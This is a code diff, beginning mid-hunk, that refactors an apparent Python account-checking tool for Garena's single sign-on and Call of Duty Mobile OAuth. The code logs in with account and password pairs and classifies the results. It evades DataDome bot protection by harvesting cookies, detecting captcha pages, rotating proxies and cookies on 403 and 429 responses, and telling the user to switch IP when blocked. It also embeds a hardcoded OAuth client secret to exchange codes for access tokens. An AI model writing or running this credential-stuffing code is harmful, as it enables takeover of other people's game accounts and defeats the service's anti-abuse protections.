+                _log('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
+                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
+            if _ip_block_callback:
+                _ip_block_callback(True)
             start_time = time.time()
-            if not ipsilent:
-                with Progress(
-                    SpinnerColumn(),
-                    TextColumn('[progress.description]{task.description}'),
-                    BarColumn(),
-                    TimeElapsedColumn(),
-                    console=console,
-                    transient=True
-                ) as progress:
-                    task = progress.add_task(
-                        '[yellow]Waiting for IP change…',
-                        total=max_wait_time
-                    )
+            if not _suppress_ip_prints:
+                with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), TimeElapsedColumn(), console=console, transient=True) as progress:
+                    task = progress.add_task('[yellow]Waiting for IP change…', total=max_wait_time)
                     while time.time() - start_time < max_wait_time:
                         time.sleep(check_interval)
-                        progress.update(
-                            task,
-                            completed=time.time() - start_time
-                        )
+                        progress.update(task, completed=time.time() - start_time)
                         current_ip = self.get_current_ip()
                         if current_ip and current_ip != original_ip:
-                            herald(
-                                'SUCCESS',
-                                f'IP changed: [dim]{original_ip}[/dim] → '
-                                f'[bold bright_green]{current_ip}[/bold bright_green]'
-                            )
-                            if ipcallback:
-                                ipcallback(False)
+                            _log('SUCCESS', f'IP changed: [dim]{original_ip}[/dim] → [bold bright_green]{current_ip}[/bold bright_green]')
+                            if _ip_block_callback:
+                                _ip_block_callback(False)
                             return True
-                herald('ERROR', 'IP did not change within time limit')
-                if ipcallback:
-                    ipcallback(False)
+                _log('ERROR', 'IP did not change within time limit')
+                if _ip_block_callback:
+                    _ip_block_callback(False)
                 return False
             else:
-                _last_tick = time.time()
+                # Silent wait — no "IP WAIT …s" tick in the live feed.
+                # Only the IP Status badge (BLOCKED/CLEAR) flips so the user sees
+                # something is happening, nothing else fills the feed.
                 while time.time() - start_time < max_wait_time:
                     time.sleep(check_interval)
-                    if time.time() - _last_tick >= 3.0:
-                        if ipcallback:
-                            ipcallback(True)
-                        try:
-                            _elapsed = int(time.time() - start_time)
-                            _ip_now = self.get_current_ip() or 'unknown'
-                            _log_line = (
-                                f'[dim]····[/dim]  [red]IP WAIT[/red]  '
-                                f'[dim]{_elapsed}s  ·  current={_ip_now}[/dim]'
-                            )
-                            _cb = globals().get('_dashboard_ref')
-                            if _cb:
-                                with _cb._lock:
-                                    _cb.recent.append(_log_line)
-                                    _cb._dirty = True
-                        except Exception:
-                            pass
-                        _last_tick = time.time()
                     current_ip = self.get_current_ip()
                     if current_ip and current_ip != original_ip:
-                        if ipcallback:
-                            ipcallback(False)
+                        if _ip_block_callback:
+                            _ip_block_callback(False)
                         return True
-                if ipcallback:
-                    ipcallback(False)
+                if _ip_block_callback:
+                    _ip_block_callback(False)
                 return False
         finally:
-            with ipwaitlock:
-                ipactive = False
-            ipevent.set()
+            with _ip_wait_lock:
+                _ip_wait_active = False
+            _ip_wait_event.set()
 
     def handle_403(self, session):
         self._403_attempts += 1
@@ -2059,7 +2151,7 @@ class Warden:
                 self.clear_datadome()
                 self.reset_counter()
                 self.clear_session_datadome(session)
-                new_datadome = garner(session)
+                new_datadome = get_datadome_cookie(session)
                 if new_datadome:
                     self.set_datadome(new_datadome)
                     self.set_session_datadome(session, new_datadome)
@@ -2068,15 +2160,12 @@ class Warden:
                 return False
         return False
 
-def garner(session, proxies_arg=None):
+def get_datadome_cookie(session, proxies=None):
     url = 'https://datadome.garena.com/js/'
     headers = {
         'host': 'datadome.garena.com',
         'sec-ch-ua-platform': '"Android"',
-        'user-agent': (
-            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
-            '(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36'
-        ),
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
         'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
         'content-type': 'application/x-www-form-urlencoded',
         'sec-ch-ua-mobile': '?1',
@@ -2101,18 +2190,9 @@ def garner(session, proxies_arg=None):
         'responsePage': 'origin',
         'ddv': '5.6.6'
     }
-    data = '&'.join(
-        f'{k}={urllib.parse.quote(str(v))}'
-        for k, v in payload.items()
-    )
+    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
     try:
-        response = session.post(
-            url,
-            headers=headers,
-            data=data,
-            proxies=proxies_arg,
-            timeout=8
-        )
+        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
         response.raise_for_status()
         response_json = response.json()
         if response_json.get('status') == 200 and 'cookie' in response_json:
@@ -2126,43 +2206,31 @@ def garner(session, proxies_arg=None):
         pass
     return None
 
-captcha = (
-    b'<html', b'<!doctype', b'datadome',
-    b'interstitial', b'captcha', b'robot', b'blocked'
-)
+_CAPTCHA_MARKERS = (b'<html', b'<!doctype', b'datadome', b'interstitial', b'captcha', b'robot', b'blocked')
+_FAKE_CHECK_BYTES = 200  # was 400 — 200 is enough to detect HTML/captcha markers
 
-def sniff(response):
+def _is_fake_response(response):
     ct = response.headers.get('content-type', '').lower()
     if 'text/html' in ct:
         return True
-    raw = response.content[:400].lower()
-    for marker in captcha:
+    raw = response.content[:_FAKE_CHECK_BYTES].lower()
+    for marker in _CAPTCHA_MARKERS:
         if marker in raw:
             return True
     return False
 
-def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
+def prelogin(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
     all_403 = True
     saw_network_error = False
     for attempt in range(retries):
         try:
             url = 'https://sso.garena.com/api/prelogin'
-            params = {
-                'app_id': '10100',
-                'account': account,
-                'format': 'json',
-                'id': str(int(time.time() * 1000))
-            }
+            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
             current_cookies = session.cookies.get_dict()
             cookie_parts = []
-            for cookie_name in [
-                'apple_state_key', 'datadome', 'sso_key',
-                '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'
-            ]:
+            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                 if cookie_name in current_cookies:
-                    cookie_parts.append(
-                        f'{cookie_name}={current_cookies[cookie_name]}'
-                    )
+                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
             cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
             headers = {
                 "Host": "sso.garena.com",
@@ -2170,42 +2238,26 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
                 "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                 "Accept": "application/json, text/plain, */*",
                 "sec-ch-ua-mobile": "?1",
-                "User-Agent": (
-                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
-                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
-                ),
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                 "sec-ch-ua-platform": '"Android"',
                 "Sec-Fetch-Site": "same-origin",
                 "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Dest": "empty",
-                "Referer": (
-                    "https://sso.garena.com/universal/login?app_id=10100"
-                    "&redirect_uri=https%3A%2F%2Faccount.garena.com%2F"
-                    "&locale=en-PH"
-                ),
+                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                 "Accept-Encoding": "gzip, deflate, br",
                 "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
             }
             if cookie_header:
                 headers['cookie'] = cookie_header
-            _to = 20 if (proxy_manager and proxy_manager.ready()) else 8
-            response = session.get(
-                url,
-                headers=headers,
-                params=params,
-                timeout=_to
-            )
+            _to = 8 if (proxy_manager and proxy_manager.is_loaded()) else 5
+            response = session.get(url, headers=headers, params=params, timeout=_to)
             if response.status_code == 403:
-                if proxy_manager and proxy_manager.ready():
+                if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
-                    session.proxies.update(proxy_manager.next())
+                    session.proxies.update(proxy_manager.get_next())
                 else:
-                    proxy_dict = (
-                        dict(session.proxies)
-                        if hasattr(session, 'proxies') and session.proxies
-                        else None
-                    )
-                    fresh_dd = garner(session, proxies_arg=proxy_dict)
+                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
+                    fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                     if fresh_dd:
                         datadome_manager.set_datadome(fresh_dd)
                         datadome_manager.set_session_datadome(session, fresh_dd)
@@ -2216,36 +2268,52 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
                 all_403 = True
                 break
             if response.status_code == 429:
-                time.sleep(2)
+                # rate-limited: rotate the throttled identity instead of waiting on it
+                rotated = False
+                if proxy_manager and proxy_manager.is_loaded():
+                    session.proxies.clear()
+                    session.proxies.update(proxy_manager.get_next())
+                    rotated = True
+                else:
+                    picked_ck = cookie_manager.pick_cookie()
+                    if picked_ck:
+                        applyck(session, picked_ck)
+                        val = extract_datadome_token(picked_ck)
+                        if val:
+                            datadome_manager.set_datadome(val)
+                            datadome_manager.set_session_datadome(session, val)
+                        rotated = True
+                    else:
+                        proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
+                        fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
+                        if fresh_dd:
+                            datadome_manager.set_datadome(fresh_dd)
+                            datadome_manager.set_session_datadome(session, fresh_dd)
+                            rotated = True
+                if not rotated:
+                    time.sleep(0.1)
                 continue
             response.raise_for_status()
-            if sniff(response):
-                bad_dd = (
-                    session.cookies.get('datadome')
-                    or datadome_manager.get_datadome()
-                )
+            if _is_fake_response(response):
+                bad_dd = session.cookies.get('datadome') or datadome_manager.get_datadome()
                 if bad_dd:
-                    cookie_manager.ban(bad_dd)
-                picked_ck = cookie_manager.pick()
+                    cookie_manager.mark_banned(bad_dd)
+                picked_ck = cookie_manager.pick_cookie()
                 if picked_ck:
-                    instill(session, picked_ck)
-                    val = pluck(picked_ck)
+                    applyck(session, picked_ck)
+                    val = extract_datadome_token(picked_ck)
                     if val:
                         datadome_manager.set_datadome(val)
                         datadome_manager.set_session_datadome(session, val)
                 else:
-                    proxy_dict = (
-                        dict(session.proxies)
-                        if hasattr(session, 'proxies') and session.proxies
-                        else None
-                    )
-                    fresh_dd = garner(session, proxies_arg=proxy_dict)
+                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
+                    fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                     if fresh_dd:
                         datadome_manager.set_datadome(fresh_dd)
                         datadome_manager.set_session_datadome(session, fresh_dd)
-                if proxy_manager and proxy_manager.ready():
+                if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
-                    session.proxies.update(proxy_manager.next())
+                    session.proxies.update(proxy_manager.get_next())
                 all_403 = False
                 if attempt < retries - 1:
                     continue
@@ -2254,9 +2322,9 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
                 data = response.json()
             except json.JSONDecodeError:
                 all_403 = False
-                if proxy_manager and proxy_manager.ready():
+                if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
-                    session.proxies.update(proxy_manager.next())
+                    session.proxies.update(proxy_manager.get_next())
                 if attempt < retries - 1:
                     continue
                 return (None, None, None)
@@ -2268,9 +2336,7 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
                 err_code = data['error']
                 if err_code == 'error_no_account':
                     return ('NO_ACCOUNT', None, new_datadome)
-                elif err_code in (
-                    'error_auth', 'error_user_ban', 'error_security_ban'
-                ):
+                elif err_code in ('error_auth', 'error_user_ban', 'error_security_ban'):
                     return ('ERROR_AUTH', err_code, new_datadome)
                 else:
                     all_403 = False
@@ -2288,33 +2354,33 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
         except requests.exceptions.ConnectionError:
             all_403 = False
             saw_network_error = True
-            if proxy_manager and proxy_manager.ready():
+            if proxy_manager and proxy_manager.is_loaded():
                 session.proxies.clear()
-                session.proxies.update(proxy_manager.next())
+                session.proxies.update(proxy_manager.get_next())
             if attempt < retries - 1:
                 continue
         except requests.exceptions.Timeout:
             all_403 = False
             saw_network_error = True
-            if proxy_manager and proxy_manager.ready():
+            if proxy_manager and proxy_manager.is_loaded():
                 session.proxies.clear()
-                session.proxies.update(proxy_manager.next())
+                session.proxies.update(proxy_manager.get_next())
             if attempt < retries - 1:
                 continue
         except requests.exceptions.ProxyError:
             all_403 = False
             saw_network_error = True
-            if proxy_manager and proxy_manager.ready():
+            if proxy_manager and proxy_manager.is_loaded():
                 session.proxies.clear()
-                session.proxies.update(proxy_manager.next())
+                session.proxies.update(proxy_manager.get_next())
             if attempt < retries - 1:
                 continue
         except requests.exceptions.SSLError:
             all_403 = False
             saw_network_error = True
-            if proxy_manager and proxy_manager.ready():
+            if proxy_manager and proxy_manager.is_loaded():
                 session.proxies.clear()
-                session.proxies.update(proxy_manager.next())
+                session.proxies.update(proxy_manager.get_next())
             if attempt < retries - 1:
                 continue
         except Exception:
@@ -2327,46 +2393,28 @@ def probe(session, account, datadome_manager, cookie_manager, retries=6, proxy_m
         return ('NETWORK_ERROR', None, None)
     return (None, None, None)
 
-def admit(session, account, password, v1, v2):
-    hashed = cipher(password, v1, v2)
+def login(session, account, password, v1, v2):
+    hashed_password = hash_password(password, v1, v2)
     url = 'https://sso.garena.com/api/login'
-    params = {
-        'app_id': '10100',
-        'account': account,
-        'password': hashed,
-        'redirect_uri': 'https://account.garena.com/',
-        'format': 'json',
-        'id': str(int(time.time() * 1000))
-    }
+    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
     current_cookies = session.cookies.get_dict()
     cookie_parts = []
     for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
         if cookie_name in current_cookies:
-            cookie_parts.append(
-                f'{cookie_name}={current_cookies[cookie_name]}'
-            )
+            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
     cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
-    headers = {
-        'accept': 'application/json, text/plain, */*',
-        'referer': 'https://account.garena.com/',
-        'user-agent': ua,
-        'sec-ch-ua': chua,
-        'sec-ch-ua-platform': '"Android"',
-        'sec-ch-ua-mobile': '?1',
-        'X-Requested-With': 'com.garena.game.codm'
-    }
+    headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': MSDK_UA,
+               'sec-ch-ua': MSDK_SEC_CH_UA,
+               'sec-ch-ua-platform': '"Android"',
+               'sec-ch-ua-mobile': '?1',
+               'X-Requested-With': 'com.garena.game.codm'}
     if cookie_header:
         headers['cookie'] = cookie_header
-    tries = 3
-    for attempt in range(tries):
+    retries = 3
+    for attempt in range(retries):
         try:
-            _to = 20
-            response = session.get(
-                url,
-                headers=headers,
-                params=params,
-                timeout=_to
-            )
+            _to = 8
+            response = session.get(url, headers=headers, params=params, timeout=_to)
             response.raise_for_status()
             login_cookies = {}
             if 'set-cookie' in response.headers:
@@ -2374,11 +2422,7 @@ def admit(session, account, password, v1, v2):
                     if '=' in cookie_str:
                         try:
                             cookie_name = cookie_str.split('=')[0].strip()
-                            cookie_value = (
-                                cookie_str.split('=')[1]
-                                .split(';')[0]
-                                .strip()
-                            )
+                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                             if cookie_name and cookie_value:
                                 login_cookies[cookie_name] = cookie_value
                         except Exception:
@@ -2390,268 +2434,136 @@ def admit(session, account, password, v1, v2):
             except Exception:
                 pass
             for k, v in login_cookies.items():
-                if k in [
-                    'sso_key', 'apple_state_key',
-                    'datadome', 'ac_session', 'session_key'
-                ]:
+                if k in ['sso_key', 'apple_state_key', 'datadome', 'ac_session', 'session_key']:
                     session.cookies.set(k, v, domain='.garena.com')
             try:
                 data = response.json()
             except json.JSONDecodeError:
-                if attempt < tries - 1:
-                    time.sleep(0.5)
+                if attempt < retries - 1:
+                    time.sleep(0.1)
                     continue
                 return None
 
             try:
-                _sk_body = (
-                    data.get('session_key')
-                    or data.get('sessionKey')
-                    or ''
-                )
+                _sk_body = data.get('session_key') or data.get('sessionKey') or ''
                 if _sk_body:
-                    session.cookies.set(
-                        'session_key', _sk_body, domain='.garena.com'
-                    )
+                    session.cookies.set('session_key', _sk_body, domain='.garena.com')
             except Exception:
                 pass
 
-            sso_key = (
-                login_cookies.get('sso_key')
-                or response.cookies.get('sso_key')
-            )
+            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
             if 'error' in data:
                 error_msg = data['error']
-                if error_msg in (
-                    'ACCOUNT DOESNT EXIST',
-                    'error_no_account',
-                    'error_auth',
-                    'error_user_ban',
-                    'error_security_ban'
-                ):
+                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                     return f'permanent_fail:{error_msg}'
-                if attempt < tries - 1:
-                    time.sleep(2)
+                if attempt < retries - 1:
+                    time.sleep(0.2)
                     continue
                 return None
             return sso_key
         except requests.RequestException:
-            if attempt < tries - 1:
+            if attempt < retries - 1:
                 time.sleep(0.5)
                 continue
     return None
 
-def identify():
+def _generate_device_id():
+    import uuid
     return f'02-{uuid.uuid4()}'
 
-def grant(session):
-    for attempt in range(retries):
+def get_codm_grant_code(session):
+    for attempt in range(OAUTH_MAX_RETRIES):
         try:
             random_id = str(int(time.time() * 1000))
             grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
             current_cookies = session.cookies.get_dict()
             cookie_parts = []
-            for name in [
-                'apple_state_key', 'fb_state', 'google_state',
-                'huawei_state', 'line_state', 'twitter_state',
-                'vk_state', 'tiktok_state', 'youtube_state',
-                'sso_key', 'datadome'
-            ]:
+            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                 if name in current_cookies:
                     cookie_parts.append(f'{name}={current_cookies[name]}')
             cookie_header = '; '.join(cookie_parts)
-            grant_headers = {
-                'Host': '100082.connect.garena.com',
-                'Connection': 'keep-alive',
-                'Accept': 'application/json, text/plain, */*',
-                'User-Agent': ua,
-                'sec-ch-ua': chua,
+            grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': MSDK_UA,
+                'sec-ch-ua': MSDK_SEC_CH_UA,
                 'sec-ch-ua-platform': '"Android"',
                 'sec-ch-ua-mobile': '?1',
-                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'Origin': 'https://100082.connect.garena.com',
-                'X-Requested-With': 'com.garena.game.codm',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Dest': 'empty',
-                'Referer': (
-                    'https://100082.connect.garena.com/universal/oauth'
-                    '?client_id=100082&locale=en-US&create_grant=true'
-                    '&login_scenario=normal&redirect_uri=gop100082://auth/'
-                    '&response_type=code'
-                ),
-                'Accept-Encoding': 'gzip, deflate',
-                'Accept-Language': 'en-US,en;q=0.9'
-            }
+                'X-Requested-With': 'com.garena.game.codm', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
             if cookie_header:
                 grant_headers['Cookie'] = cookie_header
-            grant_body = (
-                f'client_id=100082&response_type=code'
-                f'&redirect_uri=gop100082%3A%2F%2Fauth%2F'
-                f'&create_grant=true&login_scenario=normal'
-                f'&format=json&id={random_id}'
-            )
-            resp = session.post(
-                grant_url,
-                headers=grant_headers,
-                data=grant_body,
-                timeout=12
-            )
+            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
+            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=6)
             resp.raise_for_status()
             data = resp.json()
             code = data.get('code', '')
             if not code:
                 logger.error(f'[ERROR] token/grant returned no code: {data}')
             return code
-        except (
-            requests.exceptions.ProxyError,
-            requests.exceptions.ConnectionError,
-            requests.exceptions.Timeout
-        ):
-            if attempt < retries - 1:
-                gap = delay * 2 ** attempt
-                time.sleep(gap)
+        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+            if attempt < OAUTH_MAX_RETRIES - 1:
+                delay = OAUTH_RETRY_DELAY * 2 ** attempt
+                time.sleep(delay)
                 continue
             else:
-                logger.error(
-                    f'[ERROR] Error in grant after {retries} attempts'
-                )
+                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                 raise
-        except Exception:
-            logger.error('[ERROR] Error in grant (token/grant)')
+        except Exception as e:
+            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
             return ''
     return ''
 
-def swap(code, device_id=None, proxy_arg=None):
+def token_exchange(code, device_id=None, proxies=None):
     if not device_id:
-        device_id = identify()
-    if proxy_arg is None:
-        proxy_arg = None
+        device_id = _generate_device_id()
+    if proxies is None:
+        proxies = None
     CLIENT_ID = '100082'
-    CLIENT_SECRET = (
-        '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
-    )
+    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
     REDIRECT_URI = 'gop100082://auth/'
     exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
-    exchange_headers = {
-        'User-Agent': ua,
-        'sec-ch-ua': chua,
-        'sec-ch-ua-platform': '"Android"',
-        'sec-ch-ua-mobile': '?1',
-        'X-Requested-With': 'com.garena.game.codm',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Host': '100082.connect.garena.com',
-        'Connection': 'Keep-Alive',
-        'Accept-Encoding': 'gzip'
-    }
-    exchange_body = (
-        f'grant_type=authorization_code&code={code}'
-        f'&device_id={urllib.parse.quote(device_id)}'
-        f'&redirect_uri={urllib.parse.quote(REDIRECT_URI)}'
-        f'&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
-    )
-    for attempt in range(retries):
+    exchange_headers = {'User-Agent': MSDK_UA,
+                             'sec-ch-ua': MSDK_SEC_CH_UA,
+                             'sec-ch-ua-platform': '"Android"',
+                             'sec-ch-ua-mobile': '?1',
+                             'X-Requested-With': 'com.garena.game.codm', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
+    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
+    for attempt in range(OAUTH_MAX_RETRIES):
         try:
-            resp = requests.post(
-                exchange_url,
-                headers=exchange_headers,
-                data=exchange_body,
-                timeout=12,
-                proxies=proxy_arg
-            )
+            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=6, proxies=proxies)
             resp.raise_for_status()
             data = resp.json()
             access_token = data.get('access_token', '')
             if not access_token:
-                logger.error(
-                    f'[ERROR] token/exchange returned no access_token: {data}'
-                )
+                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
             return access_token
-        except (
-            requests.exceptions.ProxyError,
-            requests.exceptions.ConnectionError,
-            requests.exceptions.Timeout
-        ):
-            if attempt < retries - 1:
-                gap = delay * 2 ** attempt
-                time.sleep(gap)
+        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+            if attempt < OAUTH_MAX_RETRIES - 1:
+                delay = OAUTH_RETRY_DELAY * 2 ** attempt
+                time.sleep(delay)
                 continue
             else:
-                logger.error(
-                    f'[ERROR] Error in swap after {retries} attempts'
-                )
+                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                 raise
-        except Exception:
-            logger.error('[ERROR] Error in swap (token/exchange)')
+        except Exception as e:
+            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
             return ''
     return ''
 
-def acquire_codm(session):
+def get_codm_access_token(session):
     try:
         random_id = str(int(time.time() * 1000))
         grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
-        grant_headers = {
-            'Host': '100082.connect.garena.com',
-            'Connection': 'keep-alive',
-            'sec-ch-ua-platform': '"Android"',
-            'User-Agent': ua,
-            'Accept': 'application/json, text/plain, */*',
-            'sec-ch-ua': (
-                '"Not(A:Brand";v="8", "Chromium";v="144", '
-                '"Android WebView";v="144"'
-            ),
-            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
-            'sec-ch-ua-mobile': '?1',
-            'Origin': 'https://100082.connect.garena.com',
-            'X-Requested-With': 'com.garena.game.codm',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': (
-                'https://100082.connect.garena.com/universal/oauth'
-                '?client_id=100082&locale=en-US&create_grant=true'
-                '&login_scenario=normal&redirect_uri=gop100082://auth/'
-                '&response_type=code'
-            ),
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'en-US,en;q=0.9'
-        }
-        device_id = identify()
-        grant_data = (
-            f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F'
-            f'&response_type=code&id={random_id}'
-        )
-        grant_response = session.post(
-            grant_url,
-            headers=grant_headers,
-            data=grant_data,
-            timeout=15
-        )
+        grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': MSDK_UA, 'Accept': 'application/json, text/plain, */*', 'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'}
+        import uuid
+        device_id = f'02-{str(uuid.uuid4())}'
+        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=6)
         grant_json = grant_response.json()
         auth_code = grant_json.get('code', '')
         if not auth_code:
             return ('', '', '')
         token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
-        token_headers = {
-            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Host': '100082.connect.garena.com',
-            'Connection': 'Keep-Alive',
-            'Accept-Encoding': 'gzip'
-        }
-        token_data = (
-            f'grant_type=authorization_code&code={auth_code}'
-            f'&device_id={device_id}'
-            f'&redirect_uri=gop100082%3A%2F%2Fauth%2F'
-            f'&source=2&client_id=100082'
-            f'&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
-        )
-        token_response = session.post(
-            token_url,
-            headers=token_headers,
-            data=token_data,
-            timeout=15
-        )
+        token_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
+        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=6)
         token_json = token_response.json()
         access_token = token_json.get('access_token', '')
         open_id = token_json.get('open_id', '')
@@ -2660,59 +2572,20 @@ def acquire_codm(session):
     except Exception:
         return ('', '', '')
 
-def callback(session, access_token, open_id=None, uid=None):
+def process_codm_callback(session, access_token, open_id=None, uid=None):
     try:
-        old_url = (
-            f'https://api-delete-request.codm.garena.co.id/'
-            f'oauth/callback/?access_token={access_token}'
-        )
-        old_headers = {
-            'accept': (
-                'text/html,application/xhtml+xml,'
-                'application/xml;q=0.9,*/*;q=0.8'
-            ),
-            'user-agent': (
-                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) '
-                'AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36'
-            ),
-            'referer': 'https://auth.garena.com/'
-        }
-        old_response = session.get(
-            old_url,
-            headers=old_headers,
-            allow_redirects=False,
-            timeout=15
-        )
